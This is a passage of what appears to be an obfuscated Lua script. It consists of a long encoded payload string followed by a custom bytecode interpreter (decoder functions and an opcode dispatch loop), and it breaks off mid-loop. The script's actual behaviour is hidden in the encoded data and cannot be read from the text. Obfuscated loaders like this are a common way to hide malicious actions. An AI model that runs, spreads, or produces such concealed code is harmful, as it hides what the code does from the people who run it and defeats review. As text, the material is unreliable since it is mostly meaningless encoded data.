QY63P8D3NFY3QS03JCU3PZD31U13PZF3Q653O2Y3R4W3MXU3OU33NGD3R5136UK3PZP3PGS3QTS3QWF3QTU3QWH3Q2N3QEZ3QSJ3QWL3Q473RHT3QXS3QU43Q053Q5K3QRI3QXX3Q093NHD3ME03QSZ3Q4J3Q0H3PNK3NHL3QT53QVS3QT73OWH3R662H53QTB2IH3QTD3PNX3AQ63Q0T3QTH3NI73Q0Y3PAI3OVX3NP53QTO3ONJ3QTQ3RIR3QV23QYM3PRF3Q6I3QEZ3QTY3QSK3PFN3QVU3Q5G3N8B3QXT3PT43QU63RJ63NJ83OWR3POX3RI43N6P3QWZ3Q1X3PZ33QT63P233OWH3QUL39O13PP93JCU3PBV3N2N3QUR3NJZ3QUT3Q2D3NK53R863N353QUZ3QXF3P213QXH3Q563NPF3QDZ3OY33PYJ3Q1E3QSL3QWN3R4I3RHV3QRF3QWQ3Q1M3PFW3QVG3PQ83QVI3PCZ3QVK3Q1U3RKL3N8V3QVP3QY53Q203PQM3QVV3N4X3Q3F3N503JCU3Q3J357F3NLQ3NLS3NLU3QW63NK53PR62QQ3QW93O393Q143RK23QSE3RL93Q193QEZ3QWK3QV93Q2S3Q0N3RKB3NJ13RKD3Q4B3NJ53QXW3MZ83PRW3QY03P1V3PQG3RKM3NON3RKO3RJH3RKQ3Q2T3QY83Q4R3QYA366V3QYC3RII3PSF3QXB3P0X3Q6A3PSM3PCC3QYL3RMH3QYN3RK53QXL3RLD3Q5C3RLF3P1G3QVB3Q493RMR3QVE3RKG3NOG3HTO3PEK3QWX3RMZ3RLU3QY43RN23QRV3NFU3RLY31KN3Q4Q3GA63Q4S3PGG3JWI3PTP3Q4W3OVU3QYG3RNF3P103RL63P2O3QTT3PSQ3QTV3QYO3N3N3P2V3PXB3NA13QYU3L6L3KDH3Q6R3L7D3NAB3KKR3PUG3Q713NQ83PUP3NQA3LL33PUH3RP23OOL3Q6Z3HFE2PX3REM3AX03RFN3OOY3LY03EQ723Z3REK24T3B7Z394G3RPK2KH1H3B833RES3OPT3OPV3A6O3PVT3MSW3DG03CFI3QOH21K3PVY3QOK3NBZ3M663NC11F3B833NC425L3B7Z3INU3RGD3QP93P5Q27L3RQ936GF3RQG3OQM3RFP3PJH3QP83GVD3PWA25I3RQA37RA3B7Z2HH25D3RQS2I83RQ63PWW356D3B8339F53RQX3RFS3H5R3RR23RR13B833PK43NDG3RGG3PU63QYS3RGJ3P6H3RGM34UU25W3RQV2DH3RR23QQ63PKG3R293ORW39LC2F53PKL3PXP3OBN3B7Z3OBP3RRI2FS3RPQ3RH73P723RH93P753RHB37E73MVM3PY63DDY3RHF3PY93GQ83QR13RHK3KJU3RHM3OSR3PYH3CZK3RNN3PE83RLG3R7Q3QU33RHW3QU53RHY3R8N3RI03MWQ3RI23P813NHF3QVN3QWD3PZ23Q4M3RIA3PM13RIC3PZA3QS13NYS3QS33AFP3QS53RIJ3QS73O4X3QS93RIO3MY33QSC3RNI3ROL3Q6G3RON3RNL3NIT3RIY3RMM3RHS3RMO3RHU3Q5I3RJ43RKF3RMU3JCR3QSV3FZA3NHE3RKK3OWX3NN23QT33Q0J3OVA3RKP3Q3B3RMO3RJK3NHW3OVI3Q0R3NI13RJR3NI53RJT3QTK3PO73RJX3Q133Q6D3PZR3RIT3ROM3RIV3QTW39JF3RK73RIZ3RNP3RTP3RJ23RSN3RTS3RSP3QU73Q4E3CT63RKI3NJC3RLS3RU03P9T3DJ43R7M3RI93RLX3Q5Y39UG3Q233JNH3Q253N2K3Q273NJX3QUS3O2Y3QUU35UE3QUW3O143OXP3Q2G3ROJ3P913RNJ3RK43NNX3QV73RSI3QU03RO63RTQ3QVD3QXV3QC23OYH3PCY3HTO3R8X2AV3QVL3QUE3RI53QY33Q383RO33QX23RO63QVW3RM13QVZ3RM43Q3L3N563NG63Q3P2ED3Q3R36I03QW73O133RMD3QWB3RK13QWD3RL83RNK3RVV3QF43RML3PLE3RMN3RKA3RW03RNT3RW23POU3Q5N3QXZ3PTA3RV43Q4K3RO23RSZ3RVA3QY73RO836TK3ROA3QX73PGH3QYD35743QYF3PTT3P8W3QYJ3RVR3PTZ3RVT3Q6H3RX03NIT3QXM3QWL3QXO3OM93QRC3RUV3RLJ3RHX3RLL3RSQ3RJ73QWU3RXB3Q4H3RXD3RJD3PEQ3RWE3RT03P0K3RXJ3PGD3RN835CH3RNA3QX93PGK3PF53P2I3QYI3RNG3PPP3RMG3RTH3QV43NIP3RMJ3QF43ROQ3NDK3RGI3KE23NA33Q6P39IQ3ROW3LK33QYZ3NAC3NPZ3RP13NAO3RP33PHI3QZ13QZ73RZG3QGZ3NAS112563RPL34UU3RZO3J3F3M7J3QNZ3M7L1123Y3REK1T3B833IZO3B83376S3RRY3LER3JGE3OPC3P483GFK3DM821F3S0034UU3S0B3GFT39P13IZR3KV23L2Q3K8O3KUW3CGT3KVS3L963CO52EU1U3S043QZF3GT33J8R2413REK22A3S0C2HH3S0Y3M5O3LIQ3PI73IZL3S113AUB3S163EGK3S0G3J6T3KVN3LD63L2R3L1X3KVG3S0M3L943DDN3KVU2EU21T3S0S3IHZ3J3G3P3T3EAO2892403REK31CV38RU3S1V3M2M3S1N3E973S063NBD3LDR3NQY3IZL2383S0Z2I83S263S0F3HR33L2P3S1D3S0K3L1Y3L933L202IQ3K7X3L2Y3DDB2L23S1N3LXZ3LW13II22433REK23K3S273GMG3S022I82493S1Z3CQ83JU43S223LQD3S243LEV23V3S2U2753S363HA03S1N37UW3S1A3GS53KG43S2D3KO13KGI3L2V3KUZ3L223GOO2D523P3S2N3M7I3JGI3LTQ3P3U2G82423REK24L3S373C3N3S2W2DH2563S2Z3DRZ3MSB3S073MSD3LMO27U24S3S3Y3S4A2KH3S423S2A3S0H35CE3L2G3S1E3F113S2F3S1H3S2H2G83L2M3L2D3A3Q2EU24M3S3P3ICG3RZT3S3S3S1R39LK3REK2653S3Y3S513S123M3L3LYF3PVF113S533AUB3S593S193S2B38EY3S4I3S2E3S1G3KFZ3S1I3GA73S3L3EQ025K3S4U3IDO3S1P3M5H2G82443REK2733S3Y3S5V3PI53M5P3S343MSE34KQ3S3Y26P3S402753S5X3DMD3S3D3KV13S4H3S0J3S3H3KOD3DDL3KOF3S5L3DRI26J3S5O3A6S3JH73HZG2473REK1B3B8C394G3S6Q3BD53B8C3PVB3GRT3S5Z3S143LEV1I3S6R3OQW3B8C2I53S6V3F2M2753S693KVB3KNE3L1V3KGF3L2I3KVR3S5J3L2X3L2N3CIR2EU343K3IZ63S5Q3BPQ2463REK22Q3S722HH3S7R3S5Y3S133PVE3NBG3S7U3AUB3S7Z3EGK39Y03S4G35CG3S5F3S6D3L2U3KOE3AB83S2J3S7I3L2E3S5E3S6C3KVQ3KO23L2A3KV93S6H3LVQ3S863S8G3S3I3S893KO43KVU3J473L1U3OPT3S5G3L2T3S2G3S8I2G83S7H3S4Q3LDB27921A3S763NQK3QZG3J3I2493REK24N3S7S3AQO3S953LXG3JH33PVC3S6Y3S7X3LDT27U23A3S9C2DH3S9M2KH3S9B3GFT3S833S1B3S2C3LE53KOA3L913L2J3RS73S4N3FDO3S8R3KNY3S3G3S8N3S6E3PL23KGA3DEH3KGW3KNO3S7C3S9X3S1F3S8W3S4M3S8Y3KVJ3SA33L243S9W3L263S9Y3S7F3SA13KVT3S8K2EU2343S9E3S1O3S4W3O8K3LTR2G82483REK24Z3S9N35443S742I825N3SAV3P4K3LBE3REU3LBG3P4P3GKL3LQL3H9F3P4R35P6389D3J3737IV3ACL3D4224B3Q7W3GU33FPV113DGC35RD3OQ73HES2I825L3S6V34UC24A29Q3H1E3FTS3P5N357C39UV25G3SB4113SC93S7M3SAX3LUY3SAZ2893E4S3LAP26G3SCA3SCK3J2U3J1Z3F0W3J213DXP35Y43E4J3IE424D35E23E6L3SCI3IES3BZA3E6T3GTY3J393E6W3J3B360P3BOK3DY73Q7D3S973RZV24C3REK32DE38RU3SDE3ISS3IA334TS24F3SCW3FBT3IA73IDN3S6L3LQ33EQ724E3REK163B8P3AUB3SDU39C43SDV3IBY3IC727Y3SDK3IT835GH3ITA3HAU3SDQ3HZG24H3REK21D3SDV394G3SEC3J8Z3DF83I0R3J9Z35GI3SDZ3IO43IJF36HC37L23IRA38XD2IY24G35E23IMC3ILA3J9F3IQ23J963SEN36TJ3SEP3G2438XJ39EZ3SEU3I123IKV3IND3JAB3DJS1S3SEL3RPF3S2P3J8R24J3REK21P3SED34UU3SFJ2KH2283SDZ3J9W3HZO3IIC3G0W383Y3SFD3IJT3HZW3CY13SET3I343I2N3M893GVV37L23H4938IR3H4C3IOV3IM63D603SFY3SBQ3E3A3QAL3SG33HBS37KZ3SG73INF38023SFD3MKB3MC33HZG24I3REK22K3SFK3RGA3SDV3APN3SFP3IGC3SFR3J9Y3IHF2DA23M3SFV36IT3J983ILF36IM38B03E31390M3J9E2IZ3IM43I2O3SH53IN736IM36D43E3138TT3SF83IM33IR83IKZ3IM73E3B3IHN3SG035U02IZ3D7J3I2S3D4R36HC38RB3I1P3H4937KS3H633IKY3IN63G1136TJ38BE3IN82IW38W936UB24L3SF63IGO3IMS3IHU3IRI22O3SGL3SAW3S3R3SAY3S3T28924K3REK23Y3SGS2I83SIS2KH24W3SGW3IHC3J913FHA3SEJ3SIX3I0V3JA43IO73SH9378S3IQK38B03IPR3HRF3SJ53IOK3SHJ3SJ83BZU36D43SJB3SHO3IDC36TJ3SHZ3ML136GA3IIQ398U3E4P37JE3SHV3SJR3IPQ3SI33SG83G103I313C3N3SGC3I2J3JB63H1P3IKB3GVV38W93SGI3IRI2423SIK3S2O3MKC3HZG24N3REK2583SIT3ARL3SGU2I81H363W3G1V24M3N0M3M7X3JUK3OA53Q9M3M813MOO3J553JB03JPN3M863MKZ3M883MQZ3MH03IGU3M8F3QQE3MH53M8J3MP43MLB3PHB3MLD3MHB3MLF3NO33MLH3MPD3MDA3MPG3M4U3MPI3K793MLR39KV3MPM3KZK3MLV3MDN3RC02GA3RA93R723RX93MM73JW73M9P3JR93P833RAG3MMD3EO23MQ73ME93MMH3QHY3JDD3RAP3R9X3ODZ3MQI3R7N3OFX3OL83LZM3JS13MEQ3MET3JDY3MAK3MEV3Q1M3OFU3MQW3NXD3MQY3MF33MAV3GZG3MN836TK3MJA3MB13RBT3MJF3JXK35SY360U3MRC3JXP16366X3MRG3MJP3JT2143SKO3MNQ3MBL3MRN3JF92DI363W3MBR3JTE3JY73MK33MO13JTJ3MG33JYD1A3SKO3REG3RPG3HZG24P3RZY363W3IZO363W3HXX3B8T3QZO3CDJ3BFJ3CW13BUH3QZS3CW43I493CQZ3CKR388D3QZZ3E273E7Z3R023C313COD3CZJ3SD73BV534TQ3R092DC3EFS3Q953J0D3OA23HAP3BQX3H4U355Q39OA3L9H35693G33395G3H5Q2DL220366X3F213SNW3EOB35TF357C37ZW3SPC3BLO3FHM39O03DXY3SBM3I4C3FX53AAW3QAI3NRR3FV2399V3FV43NED3AG63JB33FNH3E0N2EA3JBY3HHR3G493MDF3IVN3DAO39WG3FKS3FQ13NS83SBU3QON39EP3NSD3Q7A3B8T3R123OC32JD3AG337VU355C3NUG3OBM22T3B8T39F53SQP3NT12IZ3M2B3RRN3RDF3OBW3GPY235363W3OC03SR03NSY3R1C35X33SQS3E4Q3INY28I39JM3HSO3I0S28S3SR72H33HJV36BN37W739O03JX93MNA3F802H53QNJ3RBR3HNH2L63JFF2D931873QBC3ME8368C3NMG2OD3N612Z63MW82Z62Z639VH2ED3JD336UA3F0H2743NF82XU3N8D2QQ3N433FIO3N0K34V62743QC2274274381435X22XU3R432QQ3QRM2DQ3PLS274379331LU2D12AV2OD2Z63JWI3N4M2Z63R4D3ST035513JWI3N2A3R7Z35T53SS43F0H2ED3PM22743PM42XU3PM62QQ3PM82DQ3PMA32U73P8O31K43H95356O3R4W356R3PZK32VW3PMJ34493RIO31RR3PMN3R9I34WE3ST73ST238LT3N7S2Z63OIJ2ED3NIO3STD35593SU53MIH36ZD3JS53NXN319L3G3V3SS03N093SS335513SS63N8I3SS939VH3SSB3OEK3SSE3RKE35743SSI3OVU3JD33SSM3F0H3SSQ3NGD3SST3AGX2N93SSW2GK3SSY362235CM3SU635CM3ST43OE03SVC3ST13JRK3STA3B8M3STD3SUQ3STG3QRZ3NK53STK3AI43NGF3STO3RT736G23STR36UL3STT3ECC3STV3ECC3STX3ECC3STZ3ECC3SU12N93SU33SSZ3SVD3JRK3SU83O1F2IX3SUC3ST83SVI35513OHI3SUH39OY3OWC3SUK3JRK3MLY3SS23MHW3SVN3NZ03SS82IX3SUT3RLI36IN3SUW3N8F2ED3SUZ3PAH3SV135UE3SSO36IN3SSR3AHN3NGF3SSV378Y369M39DU3SUF3ST33N093ST63SWC3ST93N093AOX3SWU3OEH3SVP3STI3MXG3NP53STM3RIG3O383STQ3LP93SW036G23SW236G23SW436G23SW636G23SW82DB3SWA3SWJ3SVE2OD3SWE3SUA3QDX3SUD3SYB3SUG3MO339OZ39CW3SWP3JWI3SS13PN03SXP35743SWW2ED3SWY3SSC3OWL3O133SX2386E35HT3SSK35T53SV239VH3SV43NP53SV63SXD3SSX3SXG3SXL38LT3SVG3SXK3SVJ3SXM3NG63SXO3SUP3NZ03SXR3OEK3SVS3SXV3SVV3SXY3STS3OU13SY13OEL3SY334KQ3SW53QSA3GOM3NGG3SW93BRN3SWB3SZG3SU73SWT3SWF3SUB3T023SVE366V3SVJ3SWL3SYK2FO39YI3SYN38LT3SWR3SYQ3SZK3OEH3SYT3SSA3SWZ3SSD3NGD3SYZ3SX435UE3SX63SSN35F73SZ62GG3AE33SSS3SXC3SV83SXE34RN3SZB3T053SVF3SXJ2N93SXH38LT3SVL3MIR3SXP38TI3MXC3NNI3SXS3SZO3SVU3ECC3STP3ECC3SVY36G23SY035EG3SY235EG3SY435F73SY635F73SY835TV3SYA3JEK3SXH378H3RBM35513RBO3SWG3JG83SYH3T233SWC3JEK2IH3SUH2DZ39OL35JI39QQ34VH39OU39DC39OU3H4P39OU39J839UD3HX03IHV28S239363W3O8922P3SO234UU3T2Z3SOS1X3B9M3SOK3J2C3G0935GH3RED3FY33EP03O9P3NRP3R033NRR2GE24O3Q9I3J2I3BPN3SKE3II224R3REK24O3B8T394G3T3Q3AAG39JW3EFG3SCP3GKR34TL3E6I1124Q3SDL3F8Z24T3T433A303DXW3O9G3IUV3GSB3FZI37I03J2E3EP63J2G3DY73MOL3EA83E513CSA3KFZ36G73T423GSR3JI435E23E0S3JZT3MGS3CZA3J7R3MKY3FV83E2D36HY283360P3QP6360B35XL3QNX3O8J3SCF3SIO3GRC3REK26F3T3R34UU3T5C3S7V3S553P493S483DIQ3T5D2HH2583B8T2HH3T5F3NR73LF43CHG3T3V3J2W3J203T3Y2DA3T403T4O3IE43T453FBE3T483SOE3C4U3QZW37HW36763T4E3J4X3SD73I563JAU3Q9B36J13E8E3J4T3DED3T4N3T4R3Q922GE24S3T6L37QY3CHW3T4U3MCL3DG23MOS3CMB3CZF2833E3S3FVC362P35EI3FVH3HJP3SO63SNX3SFF3J3I24U3REK26R3T5L2I83T7B3QNU3B923S6W3IZI3S083LYG26Y3T7C2DH3T7L3T7F3LF33H2S3T5T3SCO3KVZ3T5Y35Y43T603SCZ113T623FFW3T643SD03T4A3SD23REA2LZ3T6A3SD6385U3T6D3M7Z3J7C3MKU3Q9P3E4H2833T7X36QB3JI83T6O3T4P36433K7Y3T6S3JJ53E513CZD3T4Y37YL3T6Z3T513T713J892KH26S3T753S963AXK3HAW3AU53J833IDU2LV21E3B92394G3T993D9S3D422MZ3GZG351O3GOB36BM36RM1038AD38402GK1J38BZ357J36I336UL357E35YT3G843I1O36TD3AIZ3DB33T9V3AIZ35J93TA135ZY3GQA360137DL35ZY3DC53TA739803NQ83TAB376A3D313T9Y35ZY3FOC3TAE37DB3TAG3N4H35PW36ML3SY937CR39U72D5355V383N3E1K35BT39DH37DD');local a=(bit or bit32);local d=a and a.bxor or function(a,c)local b,d,e=1,0,10 while a>0 and c>0 do local f,e=a%2,c%2 if f~=e then d=d+b end a,c,b=(a-f)/2,(c-e)/2,b*2 end if a<c then a=c end while a>0 do local c=a%2 if c>0 then d=d+b end a,b=(a-c)/2,b*2 end return d end local function c(b,a,c)if c then local a=(b/2^(a-1))%2^((c-1)-(a-1)+1);return a-a%1;else local a=2^(a-1);return(b%(a+a)>=a)and 1 or 0;end;end;local a=1;local function b()local e,b,f,c=h(j,a,a+3);e=d(e,1)b=d(b,1)f=d(f,1)c=d(c,1)a=a+4;return(c*16777216)+(f*65536)+(b*256)+e;end;local function i()local b=d(h(j,a,a),1);a=a+1;return b;end;local function g()local c,b=h(j,a,a+2);c=d(c,1)b=d(b,1)a=a+2;return(b*256)+c;end;local function s()local a=b();local b=b();local e=1;local d=(c(b,1,20)*(2^32))+a;local a=c(b,21,31);local b=((-1)^c(b,32));if(a==0)then if(d==0)then return b*0;else a=1;e=0;end;elseif(a==2047)then return(d==0)and(b*(1/0))or(b*(0/0));end;return o(b,a-1023)*(e+(d/(2^52)));end;local o=b;local function t(b)local c;if(not b)then b=o();if(b==0)then return'';end;end;c=e(j,a,a+b-1);a=a+b;local b={}for a=1,#c do b[a]=k(d(h(e(c,a,a)),1))end return n(b);end;local a=b;local function q(...)return{...},l('#',...)end local function o()local h={};local d={};local a={};local j={[#{"1 + 1 = 111";"1 + 1 = 111";}]=d,[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]=nil,[#{{965;413;50;604};"1 + 1 = 111";{966;812;503;561};{398;125;516;73};}]=a,[#{{66;314;691;393};}]=h,};local a=b()local e={}for c=1,a do local b=i();local a;if(b==3)then a=(i()~=0);elseif(b==2)then a=s();elseif(b==1)then a=t();end;e[c]=a;end;for a=1,b()do d[a-1]=o();end;for j=1,b()do local a=i();if(c(a,1,1)==0)then local d=c(a,2,3);local f=c(a,4,6);local a={g(),g(),nil,nil};if(d==0)then a[3]=g();a[4]=g();elseif(d==1)then a[3]=b();elseif(d==2)then a[3]=b()-(2^16)elseif(d==3)then a[3]=b()-(2^16)a[4]=g();end;if(c(f,1,1)==1)then a[2]=e[a[2]]end if(c(f,2,2)==1)then a[3]=e[a[3]]end if(c(f,3,3)==1)then a[4]=e[a[4]]end h[j]=a;end end;j[3]=i();return j;end;local function n(a,k,e)a=(a==true and o())or a;return(function(...)local d=a[1];local g=a[3];local o=a[2];local i=q local b=1;local h=-1;local r={};local q={...};local j=l('#',...)-1;local l={};local c={};for a=0,j do if(a>=g)then r[a-g]=q[a+1];else c[a]=q[a+#{"1 + 1 = 111";}];end;end;local a=j-g+1 local a;local g;while true do a=d[b];g=a[1];if g<=171 then if g<=85 then if g<=42 then if g<=20 then if g<=9 then if g<=4 then if g<=1 then if g>0 then local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];else local h;local i;local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];i=a[3];h=c[i]for a=i+1,a[4]do h=h..c[a];end;c[a[2]]=h;b=b+1;a=d[b];if(c[a[2]]==c[a[4]])then b=b+1;else b=a[3];end;end;elseif g<=2 then c[a[2]]={};elseif g>3 then local b=a[2]c[b]=c[b](f(c,b+1,a[3]))else c[a[2]]=(not c[a[3]]);end;elseif g<=6 then if g>5 then local g;local e;e=a[2];g=c[a[3]];c[e+1]=g;c[e]=g[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];e=a[2]c[e]=c[e](f(c,e+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];e=a[2];g=c[a[3]];c[e+1]=g;c[e]=g[a[4]];else c[a[2]]=a[3];end;elseif g<=7 then local h;local g;c[a[2]]=(a[3]~=0);b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];elseif g==8 then e[a[3]]=c[a[2]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];else local d=a[2];local f=a[4];local e=d+2 local d={c[d](c[d+1],c[e])};for a=1,f do c[e+a]=d[a];end;local d=d[1]if d then c[e]=d b=a[3];else b=b+1;end;end;elseif g<=14 then if g<=11 then if g>10 then local h;local g;c[a[2]]();b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];else local g;local f;local e;c[a[2]]={};b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];e=a[2];f=c[e]g=c[e+2];if(g>0)then if(f>c[e+1])then b=a[3];else c[e+3]=f;end elseif(f<c[e+1])then b=a[3];else c[e+3]=f;end end;elseif g<=12 then local d=a[2];local e=c[d]local f=c[d+2];if(f>0)then if(e>c[d+1])then b=a[3];else c[d+3]=e;end elseif(e<c[d+1])then b=a[3];else c[d+3]=e;end elseif g==13 then local h;local g;g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];e[a[3]]=c[a[2]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];else local h;local i;local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];i=a[3];h=c[i]for a=i+1,a[4]do h=h..c[a];end;c[a[2]]=h;b=b+1;a=d[b];if(c[a[2]]==c[a[4]])then b=b+1;else b=a[3];end;end;elseif g<=17 then if g<=15 then local h;local i;local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];i=a[3];h=c[i]for a=i+1,a[4]do h=h..c[a];end;c[a[2]]=h;b=b+1;a=d[b];if(c[a[2]]==c[a[4]])then b=b+1;else b=a[3];end;elseif g>16 then c[a[2]]=c[a[3]][a[4]];else local g;local i;local h;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];h=a[2]c[h]=c[h](f(c,h+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];i=a[3];g=c[i]for a=i+1,a[4]do g=g..c[a];end;c[a[2]]=g;b=b+1;a=d[b];if(c[a[2]]==c[a[4]])then b=b+1;else b=a[3];end;end;elseif g<=18 then c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];elseif g==19 then local h;local g;c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=a[3];else c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];end;elseif g<=31 then if g<=25 then if g<=22 then if g==21 then local g;local i;local h;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];h=a[2]c[h]=c[h](f(c,h+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];i=a[3];g=c[i]for a=i+1,a[4]do g=g..c[a];end;c[a[2]]=g;b=b+1;a=d[b];if(c[a[2]]==c[a[4]])then b=b+1;else b=a[3];end;else local h;local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]